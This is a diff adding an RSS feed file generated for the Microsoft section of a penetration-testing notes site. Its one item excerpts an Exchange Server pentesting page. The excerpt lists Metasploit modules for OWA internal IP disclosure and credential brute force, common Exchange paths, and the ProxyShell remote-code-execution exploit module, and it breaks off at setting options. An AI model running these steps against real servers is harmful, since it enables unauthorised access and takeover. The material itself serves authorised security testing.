@@ -1,0 +1,19 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title>Microsoft on D0CUM3NTN4T10N</title>
+    <link>https://documentnation.github.io/docs/hdks/web/microsoft/</link>
+    <description>Recent content in Microsoft on D0CUM3NTN4T10N</description>
+    <generator>Hugo -- gohugo.io</generator>
+    <language>en</language>
+    <lastBuildDate>Wed, 17 Jan 2024 11:57:42 +0530</lastBuildDate>
+    <atom:link href="https://documentnation.github.io/docs/hdks/web/microsoft/index.xml" rel="self" type="application/rss+xml" />
+    <item>
+      <title>Microsoft Exchange Server Pentesting</title>
+      <link>https://documentnation.github.io/docs/hdks/web/microsoft/microsoft-exchange-server-pentesting/</link>
+      <pubDate>Sun, 23 Apr 2023 00:00:00 +0000</pubDate>
+      <guid>https://documentnation.github.io/docs/hdks/web/microsoft/microsoft-exchange-server-pentesting/</guid>
+      <description>Enumeration linkOWA (Outlook Web Access) link msfconsole # Client Access Server (CAS) IIS HTTP Internal IP Disclosure msf&amp;gt; use auxiliary/scanner/http/owa_iis_internal_ip # Brute Force credentials msf&amp;gt; use auxiliary/scanner/http/owa_login Common Directories link # Autodiscover service /autodiscover/ /autodiscover/autodiscover.xml # Enhanced Client or Proxy /ecp/ # Exchange Web Services /ews/ # Offline Address Books /oab/ # Outlook Web Access /owa/ /owa/auth/login.aspx ProxyShell RCE linkCVE-2021-31207, CVE-2021-34523, CVE-2021-34473 Reference: https://www.rapid7.com/db/modules/exploit/windows/http/exchange_proxyshell_rce/&#xA;msfconsole msf&amp;gt; use exploit/windows/http/exchange_proxyshell_rce msf&amp;gt; (set options.</description>
+    </item>
+  </channel>
+</rss>
